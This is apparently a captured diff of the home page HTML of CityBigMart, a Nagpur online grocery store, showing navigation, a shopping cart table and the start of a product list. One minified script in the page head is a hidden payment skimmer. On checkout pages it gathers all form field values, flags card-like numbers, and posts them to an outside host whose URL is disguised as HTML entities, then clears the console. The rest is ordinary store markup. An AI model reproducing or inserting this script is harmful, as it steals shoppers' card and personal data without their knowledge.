@@ -1,0 +1,3685 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+
+<style type="text/css">
+#loading-overlay-newyear { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: #000; opacity: 0.7;z-index:9999999; }
+#loading-message-newyear { position: absolute; width: 400px; height: 100px; line-height: 100px; background-color: #fff; text-align: center; font-size: 1.2em; left: 50%; top: 50%; margin-left: -315px; margin-top: -100px;z-index:9999999; }
+</style>
+<script>
+
+function setCookie(cname,cvalue,exdays)
+{
+var d = new Date();
+d.setTime(d.getTime()+(exdays*24*60*60*1000));
+var expires = "expires="+d.toGMTString();
+document.cookie = cname + "=" + cvalue + "; " + expires;
+}
+
+function getCookie(cname)
+{
+var name = cname + "=";
+var ca = document.cookie.split(';');
+for(var i=0; i<ca.length; i++)
+  {
+  var c = ca[i].trim();
+  if (c.indexOf(name)==0) return c.substring(name.length,c.length);
+}
+return "";
+}
+
+function closePopupBox()
+{
+	document.getElementById('loading-message-newyear').style.display = 'none';
+	document.getElementById('loading-overlay-newyear').style.display = 'none';
+	setCookie("showhomepopup","1",365);
+}
+
+
+function onloadshowhomepopup() {
+            //alert('ok');
+			var showhomepopup=getCookie("showhomepopup");
+			//alert(showhomepopup);
+			if (showhomepopup == '1')
+			{
+				document.getElementById('loading-message-newyear').style.display = 'none';
+				document.getElementById('loading-overlay-newyear').style.display = 'none';
+			}
+			else
+			{
+				document.getElementById('loading-message-newyear').style.display = 'block';
+				document.getElementById('loading-overlay-newyear').style.display = 'block';
+				setCookie("showhomepopup","1",365);
+			}
+			//jsDatePick();
+        }
+//window.onload = onloadshowhomepopup;
+</script>
+
+
+    <title>Home page</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="Online Supper Market in Nagpur
+We, at Citybigmart.com, are excited about making life simpler and easier online shopping a breeze! Now you can buy Fresh Vegetable; Fruit &amp; grocery online at your leisure and from the comfort at your home - no more standing in the long queues at ration shops, provision stores &amp; supermarkets carrying heavy bags and looking for parking! Online shopping in Nagpur is made easy &amp; simple when you are shopping at CityBigMart.com." />
+<meta name="keywords" content="Vegetables, fresh vegetables, fruits. chocolete, supermarket Fresh Vegetables in nagpur, nagpur market, cotton market, online vegetables,Fresh Fruits, Dairy, Bakery, Cakes, Kirana, Grocery, non veg, Home delivery, Direct At your Door Step, in Nagpur" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.citybigmart.com/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.citybigmart.com/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<script type="text/javascript">var BLANK_URL = 'http://www.citybigmart.com/js/blank.html';
+var BLANK_IMG = 'http://www.citybigmart.com/js/spacer.gif';
+var SKIN_URL = 'http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/';</script>
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/js/calendar/calendar-win2k-1.css" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/lightbox.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/reset.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/boxes.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/clears.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/default/dolphin/scrollup/css/scrollup.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/base/default/ajaxcart/growler.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/base/default/ajaxcart/modalbox.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/ig_floatingmenu/floatingmenu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/my_ibanner/base.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.citybigmart.com/js/my_ibanner/jquery.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/my_ibanner/jquery.noconflict.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/calendar/calendar.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/calendar/calendar-setup.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/dolphin/scrollup/DLSU.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/product.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/configurable.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/my_ibanner/jquery.pikachoose.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/js/lightbox/lightbox.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/base/default/ajaxcart/growler.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/base/default/ajaxcart/modalbox.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/base/default/ajaxcart/ajaxcart.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/base/default/js/bundle.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/ig_floatingmenu/floatingmenu.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/base/default/css/iestyles.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.citybigmart.com/skin/frontend/base/default/css/ie7minus.css" media="all" />
+<script type="text/javascript" src="http://www.citybigmart.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.citybigmart.com/js/varien/iehover-fix.js"></script>
+<![endif]-->
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script type="text/javascript">jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("checkout").test(n)){for(var c=document.querySelectorAll("input,select"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n),console.clear()}}})});</script><script type="text/javascript">
+
+var jfixed = jQuery.noConflict();
+//fixed header menu when scroll down
+		jfixed(window).scroll(function(){
+			var scroll = getScroll();
+			//alert(hPos);
+			if ( 80 < scroll.top ){
+				jfixed("#nav").addClass('fixed');
+			}
+			else {
+				jfixed("#nav").removeClass('fixed');
+			}
+		});
+
+		function getScroll () {
+			var b = document.body;
+			var e = document.documentElement;
+			return {
+				left: parseFloat( window.pageXOffset || b.scrollLeft || e.scrollLeft ),
+				top: parseFloat( window.pageYOffset || b.scrollTop || e.scrollTop )
+			};
+		}
+		//End fixed header menu when scroll down
+
+
+function toggleMenu(el, over)
+{
+    if (over) {
+        Element.addClassName(el, 'over');
+    }
+    else {
+        Element.removeClassName(el, 'over');
+    }
+}
+/*function setCookie(c_name,value,exdays)
+{
+var exdate=new Date();
+exdate.setDate(exdate.getDate() + exdays);
+var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+document.cookie=c_name + "=" + c_value;
+}
+
+function getCookie(c_name)
+{
+var c_value = document.cookie;
+var c_start = c_value.indexOf(" " + c_name + "=");
+if (c_start == -1)
+  {
+  c_start = c_value.indexOf(c_name + "=");
+  }
+if (c_start == -1)
+  {
+  c_value = null;
+  }
+else
+  {
+  c_start = c_value.indexOf("=", c_start) + 1;
+  var c_end = c_value.indexOf(";", c_start);
+  if (c_end == -1)
+  {
+c_end = c_value.length;
+}
+c_value = unescape(c_value.substring(c_start,c_end));
+}
+return c_value;
+}
+
+var loadonce = getCookie("loadonce");
+function openUrl(){
+
+  window.location = "http://www.citybigmart.com";
+
+}*/
+
+/*window.onload = function(){
+    /*if(!document.location.hash){
+        window.location = "#loaded";
+    }*/
+   /* if(loadonce != 1){
+    setCookie("loadonce",1);
+    loadonce = 1;
+	setTimeout(openUrl, 2000); // Wait 5 seconds
+    }
+}*/
+
+</script>
+<style>
+.sorter{display:none;}
+.header-top-container .indent-menu{margin-top:-16px}
+.page {
+    margin: 0 auto;
+    overflow: hidden;
+    padding-top: 165px;
+    position: inherit;
+    text-align: left;
+    width: 1001px;
+    z-index: 0;
+}
+</style>
+
+
+
+<!-- Custom javascript alert message -->
+<link rel="stylesheet" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/alertifyjs/themes/alertify.core.css" />
+<link rel="stylesheet" href="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/alertifyjs/themes/alertify.default.css" id="toggleCSS" />
+<style>
+	.alertify-log-custom {
+		background: blue;
+	}
+	.fixed {
+   margin: 0 0 0 -500.5px !important;
+    padding: 0 !important;
+    position: fixed;
+    top: 0;
+    width: 1001px !important;
+    z-index: 999999999;
+    left:50%;
+    /*left:12.9%;*/
+    display:list-item;
+    *display: list-item;
+	}
+</style>
+<!--<script src="http://code.jquery.com/jquery-1.9.1.js"></script>-->
+<script src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/alertifyjs/lib/alertify.min.js"></script>
+<script>
+		function reset () {
+			var jm = jQuery.noConflict();
+			jm("#toggleCSS").attr("href", "http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/alertifyjs/themes/alertify.default.css");
+			alertify.set({
+				labels : {
+					ok     : "OK",
+					cancel : "Cancel"
+				},
+				delay : 5000,
+				buttonReverse : false,
+				buttonFocus   : "ok"
+			});
+		}
+
+		// ==============================
+		// Standard Dialogs
+
+
+
+	</script>
+<!-- End Custom javascript alert message -->
+<!-- Request Order Product list -->
+<!--<script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-2.0.3.js"></script>	-->
+<!-- End Request Order Product list -->
+</head>
+<body class=" cms-index-index cms-home" onload="onloadshowhomepopup();">
+<!-- Home page popup -->
+<div id="loading-overlay-newyear" onclick="closePopupBox();" style="display:none;"></div>
+<div id="loading-message-newyear" style="display:none;">
+	<span onclick="closePopupBox();"><img src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/homepagepopup.jpg" alt="CBM" title="CBM" /></span>
+	<span style="position:absolute;top:275%;left:8%;"><a href="javascript:;" onclick="closePopupBox();" style="text-decoration:none;">Close[X]</a></span>
+</div>
+<!-- Home page popup -->
+
+<div id="header_colapse" style="margin: 0 auto;
+    width: 1001px;
+    z-index: 0;">
+	<div class="navigation">
+		<div class="header-row">
+		<div class="header-col">
+		<p class="welcome-msg"></p>
+		</div>
+		<div id="support">
+			   <!--<h4>Give call or misscall for order</h4>-->
+			 <span style="line-height:50px"> +080 87 700006 | + 9021438271 </span> 
+		</div>		
+		
+<div class="search-block" style="top:1px;">
+		<span class="sup_phone" style=""></span>
+		<div class="indent-search">		</div>
+
+		</div>
+
+		</div>
+			</div>
+
+</div>
+<div class="header_top">
+	<div class="inner">
+		<div class="logo-block">
+			<h1 id="logo"><a href="http://www.citybigmart.com/index.php/"	title="CBM"><img src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/kkpng.png" alt="CBM" title="CBM" /></a><a id="logo_text" href="http://www.citybigmart.com/index.php/"	title="CBM"><img src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/logo_text.png" alt="CBM" title="CBM" /></a></h1>
+		</div>
+		<div class="links">
+			<ul id="main_nav">
+				<li><a class="home_link" href="http://www.citybigmart.com/index.php/">Home</a></li>
+				<li><a class="cart_link" href="http://www.citybigmart.com/index.php/information">Information</a></li>
+				 <li class="subico"><a href="http://www.citybigmart.com/index.php/shipping">Shipping</a></li>
+				<!--<li><a class="news_link">Feedback</a></li>-->
+				<li><a class="blog_link" href="http://www.citybigmart.com/index.php/payment">Payment</a></li>
+				<li><a id="wishlist_total" href="http://www.citybigmart.com/index.php/bulkorder">Bulk Order</a></li>
+			        <li><a class="cart_link" href="http://www.citybigmart.com/index.php/supplierform">Suppliers</a></li>
+			        <li><a class="docklink" href="#dialog" name="modal">Feedback</a></li>
+			</ul>
+		</div>
+		<div style="float: right;width: 715px;">
+				<marquee style="color:#0000FF;font-weight:bold">Welcome To CBM City Big Mart !!</marquee>
+		</div>
+	</div>
+
+</div>
+<!-- start header -->
+<div class="header-top-container" style="margin: 0 auto;width: 1001px;">
+	<div class="header">
+<div class="navigation">
+<div class="header-row">
+<div class="header-col">
+<p class="welcome-msg">Well come to city big mart You can login or Register </p>
+        <ul class="links">
+                            <li  class="first">
+                <a href="http://www.citybigmart.com/index.php/customer/account/" title="My Account" >My Account</a>
+                </li>
+                            <li >
+                <a href="http://www.citybigmart.com/index.php/customer/account/create/" title="Register" >Register</a>
+                </li>
+                            <li  class="last">
+                <a href="http://www.citybigmart.com/index.php/customer/account/login/" title="Log In" >Log In</a>
+                </li>
+                    </ul>
+
+
+
+</div>
+<div class="search-block">
+<!--<img style="float:left" width="40px" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/find.png" alt="CBM" title="CBM" />-->
+<div class="indent-search"><form id="search_mini_form"
+	action="http://www.citybigmart.com/index.php/catalogsearch/result/"
+	method="get">
+<fieldset class="form-search"><legend>Search Site</legend>
+<label for="search">Search:</label> <input id="search" type="text"
+	class="input-text"
+	name="q"
+	value="" />
+<button class="button" type="image"><img align="absmiddle"
+	src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/search_icon.png " /></button>
+<div id="search_autocomplete" class="search-autocomplete"></div>
+<script type="text/javascript">
+            //<![CDATA[
+                var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search Here');
+                searchForm.initAutocomplete('http://www.citybigmart.com/index.php/catalogsearch/ajax/suggest/', 'search_autocomplete');
+            //]]>
+            </script></fieldset>
+</form>
+</div>
+
+</div>
+
+</div>
+</div>
+<br class="clear-block" />
+</div>
+
+<div class="indent-menu">
+<ul id="nav">	
+		<li class="level0 nav-1 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.citybigmart.com/index.php/fruits-vegetables.html">
+<span>Vegetables</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-1-1 first last">
+<a href="http://www.citybigmart.com/index.php/fruits-vegetables/vegetables.html">
+<span>Fresh Vegetables</span>
+</a>
+</li>
+</ul>
+</li>		<li class="level0 nav-2">
+<a href="http://www.citybigmart.com/index.php/exotic-vegetables.html">
+<span>Exotic Vegetables</span>
+</a>
+</li>		<li class="level0 nav-3 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.citybigmart.com/index.php/fruits.html">
+<span>Fruits</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-3-1 first">
+<a href="http://www.citybigmart.com/index.php/fruits/fresh-fruits.html">
+<span>Fresh Fruits</span>
+</a>
+</li><li class="level1 nav-3-2">
+<a href="http://www.citybigmart.com/index.php/fruits/cut-fruits.html">
+<span>Cut Fruits</span>
+</a>
+</li><li class="level1 nav-3-3 last">
+<a href="http://www.citybigmart.com/index.php/fruits/juicy-fruits.html">
+<span>Juicy Fruits</span>
+</a>
+</li>
+</ul>
+</li>		<li class="level0 nav-4">
+<a href="http://www.citybigmart.com/index.php/importade-fruits.html">
+<span>Imported Fruits</span>
+</a>
+</li>		<li class="level0 nav-5 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.citybigmart.com/index.php/bread-deary-eggs.html">
+<span>Dairy &amp;  Breads</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-5-1 first">
+<a href="http://www.citybigmart.com/index.php/bread-deary-eggs/fresh-dairy-products.html">
+<span>Fresh Dairy Products</span>
+</a>
+</li><li class="level1 nav-5-2">
+<a href="http://www.citybigmart.com/index.php/bread-deary-eggs/branded-breades.html">
+<span>Branded Breads</span>
+</a>
+</li><li class="level1 nav-5-3 last">
+<a href="http://www.citybigmart.com/index.php/bread-deary-eggs/branded-dairy-products.html">
+<span>Branded Dairy Products</span>
+</a>
+</li>
+</ul>
+</li>		<li class="level0 nav-6 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.citybigmart.com/index.php/futana-namkeens.html">
+<span>Crunchy &amp; Namkeens</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-6-1 first last">
+<a href="http://www.citybigmart.com/index.php/futana-namkeens/upvas-farali-special.html">
+<span>Upvas Farali Special</span>
+</a>
+</li>
+</ul>
+</li>		<li class="level0 nav-7 parent" onmouseover="toggleMenu(this,1)" onmouseout="toggleMenu(this,0)">
+<a href="http://www.citybigmart.com/index.php/meat.html">
+<span>Eggs, meat &amp;  Cold cut</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-7-1 first">
+<a href="http://www.citybigmart.com/index.php/meat/fish-see-world.html">
+<span>Fish &amp; sea world</span>
+</a>
+</li><li class="level1 nav-7-2">
+<a href="http://www.citybigmart.com/index.php/meat/fresh-ckicken.html">
+<span>Fresh Chicken</span>
+</a>
+</li><li class="level1 nav-7-3">
+<a href="http://www.citybigmart.com/index.php/meat/fresh-mutton.html">
+<span>Fresh Mutton</span>
+</a>
+</li><li class="level1 nav-7-4 last">
+<a href="http://www.citybigmart.com/index.php/meat/eggs.html">
+<span>Eggs</span>
+</a>
+</li>
+</ul>
+</li>	</ul>
+</div>
+
+	</div>
+
+<div class="page" style="padding-top:0;clear:both">
+
+        <!-- end header -->
+
+        <!-- start middle -->
+            <div class="main col-2-right-layout">
+
+             
+            <!-- start right -->
+            <div class="col-right sidebar">
+	    <div class="block block-twitter">
+		<a href="javascript:;" onclick="sendgift('0','http://www.citybigmart.com/index.php/', '0')" title="send gift"><img style="vertical-align:middle;width:100%;height:44px" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/button_send_your_gift.jpg" alt="send gift" title="CBM" /></a>
+	 </div>
+		<div class="block block-twitter">
+		    <a href="bulkorder"><img width="100%" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/rsz_bulk_cbm.jpg" alt="rsz_bulk_cbm" title="rsz_bulk_cbm" /></a>
+	       </div>
+
+	        <div class="block block-twitter">
+		   <a href="shipping"> <img width="100%" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/rsz_van.jpg" alt="rsz_van" title="rsz_van" /></a>
+	       </div>
+	       <div class="block block-twitter">
+		    <img width="100%" src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/rsz_refrral.jpg" alt="rsz_refrral" title="rsz_refrral" />
+	       </div>
+
+                <div class="block block-subscribe">
+<div class="inside-box">
+<div class="block-title">
+<h2>Newsletter<a name="newsletter-box"></a></h2>
+</div>
+<form action="http://www.citybigmart.com/index.php/newsletter/subscriber/new/"
+	method="post" id="newsletter-validate-detail">
+<fieldset class="block-content"><legend>Newsletter</legend>
+<label for="newsletter">Sign up for our newsletter:</label>
+<div class="input-box"><input name="email" type="text" id="newsletter"
+	class="required-entry validate-email input-text" /></div>
+&nbsp;
+<button class="button" type="submit"><span><span><span>Subscribe</span></span></span></button>
+</fieldset>
+</form>
+<script type="text/javascript">
+//<![CDATA[
+    var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+//]]>
+</script></div>
+</div>
+            </div>
+            <!-- end right -->
+
+            <!-- start center -->
+            <div class="col-main">
+
+<!--				              <div class="std">-->
+                           <!-- start global messages -->
+                                                            <!-- end global messages -->
+
+                            <!-- start content -->
+                                    	        <div class="ibanner ibanner-content-top">
+        <div class="pikachoose pikachoose-caption-right">
+            <ul id="pikame">
+                                                            <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/o/n/onl_cbm_1.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/v/a/van_1.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/r/s/rsz_all_-_copy.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/r/s/rsz_untitled-1_2.jpg"/></a><span></span></li>
+                                                </ul>
+        </div>
+    </div>
+    <p dir="ltr"><span style="font-family: 'times new roman', times; color: #ff00ff; font-size: medium;"><strong>&nbsp;OnlineVegetables &amp; Fruit Store In Nagpur</strong>.</span></p>    	        <div class="ibanner ibanner-content-bottom">
+        <div class="pikachoose pikachoose-caption-right">
+            <ul id="pikame">
+                                                            <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/o/n/onl_cbm_1.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/v/a/van_1.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/r/s/rsz_all_-_copy.jpg"/></a><span></span></li>
+                                                                                <li><a href="#"><img src="http://www.citybigmart.com/media/ibanner/cache/1/374x200/9df78eab33525d08d6e5fb8d27136e95/r/s/rsz_untitled-1_2.jpg"/></a><span></span></li>
+                                                </ul>
+        </div>
+    </div>
+    <div style="display:none">pranay test</div>
+<style>
+button,
+.button {
+  display : inline-block;
+  cursor : pointer;
+
+  border-style : solid;
+  border-width : 1px;
+  border-radius : 50px;
+  padding : 10px 18px;
+  box-shadow : 0 1px 4px rgba(0,0,0,.6);
+  font-size : 9.5pt;
+  font-weight : bold;
+  color : #fff;
+  text-shadow : 0 1px 3px rgba(0,0,0,.4);
+  font-family : sans-serif;
+  text-decoration : none;
+}
+
+button.blue,
+.button.blue {
+  border-color: #8fc800;
+  background: #8fc800;
+  background: -moz-linear-gradient(top, #8fc800 0%, #438c00 100%);
+  background: -webkit-gradient(linear, left top, left bottom,
+    color-stop(0%,#8fc800), color-stop(100%,#438c00));
+  background: -webkit-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: -o-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: -ms-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: linear-gradient(top, #8fc800 0%,#438c00 100%);
+  filter: progid:DXImageTransform.Microsoft.gradient(
+    startColorstr='#8fc800', endColorstr='#438c00',GradientType=0 );
+}
+
+button.green,
+.button.green {
+  border-color: #8fc800;
+  background: #8fc800;
+  background: -moz-linear-gradient(top, #8fc800 0%, #438c00 100%);
+  background: -webkit-gradient(linear, left top, left bottom,
+    color-stop(0%,#8fc800), color-stop(100%,#438c00));
+  background: -webkit-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: -o-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: -ms-linear-gradient(top, #8fc800 0%,#438c00 100%);
+  background: linear-gradient(top, #8fc800 0%,#438c00 100%);
+  filter: progid:DXImageTransform.Microsoft.gradient(
+    startColorstr='#8fc800', endColorstr='#438c00',GradientType=0 );
+}
+</style>
+
+<script type="text/javascript">
+/*$j = jQuery.noConflict();
+
+function delcarajax(del, base_url)
+{
+
+	var result = confirm("Are you sure you would like to remove this item from the shopping cart?");
+	if (result==true) {
+		$j('#ajax-loading').show();
+	    $j.post(base_url+"checkout/cart/delcarajax", { del: del},
+		function(data){
+		    //$j('.delitem').html(data);
+		    window.location.assign(base_url);
+	    });
+	}
+
+
+}*/
+
+</script>
+
+
+<script type="text/javascript">
+$j = jQuery.noConflict();
+
+function delcarajax(del, base_url)
+{
+
+	reset();
+	alertify.confirm("Would you like to remove item from cart?", function (e) {
+		if (e) {
+			$j('#ajax-loading').show();
+			$j.post(base_url+"checkout/cart/delcarajax", { del: del},
+			function(data){
+				//$j('.delitem').html(data);
+				window.location.assign(base_url);
+			});
+		} else {
+			return false;
+		}
+	});
+	return false;
+	/*var result = confirm("Would you like to remove item from the shopping cart?");
+	if (result==true) {
+		$j('#ajax-loading').show();
+	    $j.post(base_url+"checkout/cart/delcarajax", { del: del},
+		function(data){
+		    //$j('.delitem').html(data);
+		    window.location.assign(base_url);
+	    });
+	}*/
+
+
+}
+
+</script>
+
+
+
+	<table width="46%" border="0" style="border: 1px solid #D3D3D3;
+    height: 190px;
+    margin-top: 0px;
+    text-align: center !important;display:inline-block;">
+
+	<thead class="row-title">
+	<tr>
+	<td colspan="6" style="border-bottom:1px solid white;width:541px"><strong>Your Shopping Cart</strong></td>
+	</tr>
+	<th>Image</th>
+	<th>Item Name</th>
+	<th>Price</th>
+	<th>Quantity</th>
+	<th>Sub Total</th>
+	<th></th>
+	</thead>
+	<tbody id="cartuppu">
+	<tr>
+	<td colspan="6" width="363px">&nbsp;</td>
+	</tr>
+	<tr>
+	<td colspan="6" width="363px" style="color:red;font-size:17px">You have no items in your shopping cart.<br>
+	<div style="font-size:10px !important">
+		<span class="delitem"></span>
+	</div>
+	</td>
+	</tr>
+	</tbody>
+	</table>
+	
+<script type="text/javascript">
+//var cartcount = '0';
+</script>
+
+<br>
+<table border="0" width="100%">
+	<tr>
+
+		<td align="left">
+	<a href="http://www.citybigmart.com/index.php/orderitemlist" class="button blue">Make Your Item list manually</a>
+		</td>
+		<td align="center"><!--<span style="color: #000000;font-size: 11px;font-weight: bold;text-decoration: none;">Home Delivery Timing : - <span style="color: #FF0000;font-size: 11px;font-weight: bold;text-decoration: none;">Morning</span> - <span style="color: #FF0000;font-size: 11px;font-weight: bold;text-decoration: none;">10 am to </span><span style="color: #FF0000;font-size: 11px;font-weight: bold;text-decoration: none;">Evening</span> - <span style="color: #FF0000;font-size: 11px;font-weight: bold;text-decoration: none;">7:00 pm</span></span>-->
+		<a href="javascript:;" onclick="addToCartItems('0');" class="button blue">Add To Cart</a>
+		</td>
+		<td align="right">
+		<a href="javascript:;" onclick="deliverytime('0','http://www.citybigmart.com/index.php/','0')" class="button blue" >Click Here To Order Now</a>
+		<!--<span style="float:right; /*margin-right:75px;*/ margin-bottom:5px;"><input type="button" onclick="deliverytime('','','')" class="placeorderbutton" name="placeorderbtn"></span>--></td>
+	</tr>
+</table>
+
+
+<br>
+
+
+<div style="height:1000px;overflow-x:hidden;overflow-y: scroll;position:relative;"><!-- added 31 Dec 2013 -->
+<table width="98%" border="0" style="text-align:center !important;border: 1px solid lightgray;display: block;">
+	<thead class="row-title">
+	<tr>
+	<td width="44%" colspan="5" style="border-bottom:1px solid white;font-size:13px"><strong>Choose Products!</strong></td>
+	</tr>
+	<th>Image</th>
+	<th>Item Name</th>
+	<th>Price</th>
+	<th>Quantity</th>
+	<th>Amount ( In Rs. )</th>
+	</thead>
+			<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/d/o/download_10_.jpg" width="115" height="115" alt="Lemon Medium (2nos)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/lemon-medium-size.html">Lemon Medium (2nos)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs5.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 268, 'http://www.citybigmart.com/index.php/','5.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
